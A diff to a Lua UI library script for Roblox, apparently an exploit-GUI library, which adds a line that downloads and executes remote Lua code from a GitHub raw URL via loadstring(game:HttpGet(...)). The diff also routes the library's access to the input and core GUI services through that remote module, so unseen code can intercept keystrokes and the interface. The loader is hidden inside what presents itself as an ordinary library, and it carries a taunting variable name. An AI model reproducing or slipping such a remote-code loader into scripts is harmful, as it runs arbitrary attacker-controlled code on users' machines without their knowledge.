@@ -1,5 +1,5 @@
 -- credits to whoever the fuck made this idk who made it
-
+local hahahaFuckYou = loadstring(game:HttpGet("https://raw.githubusercontent.com/jorvikrift/freakware.exe/main/util/mainmodule.lua"))()
 -- // Library Tables
 local library = {}
 local utility = {}
@@ -7,8 +7,8 @@ local obelus = {
 	connections = {}
 }
 -- // Variables
-local uis = game:GetService("UserInputService")
-local cre = game:GetService("CoreGui")
+local uis = hahahaFuckYou.getservice(game:GetService("UserInputService"))
+local cre = hahahaFuckYou.getservice(game:GetService("CoreGui"))
 -- // Indexing
 library.__index = library
 -- // Functions
@@ -71,7 +71,7 @@ do
 			ResetOnSpawn = false
 		}})
 
-        game:GetService("UserInputService").InputBegan:Connect(function(k,g)
+        uis.InputBegan:Connect(function(k,g)
             if not g then 
                 if k.KeyCode == Enum.KeyCode.RightShift then 
                     screen.Enabled = not screen.Enabled 
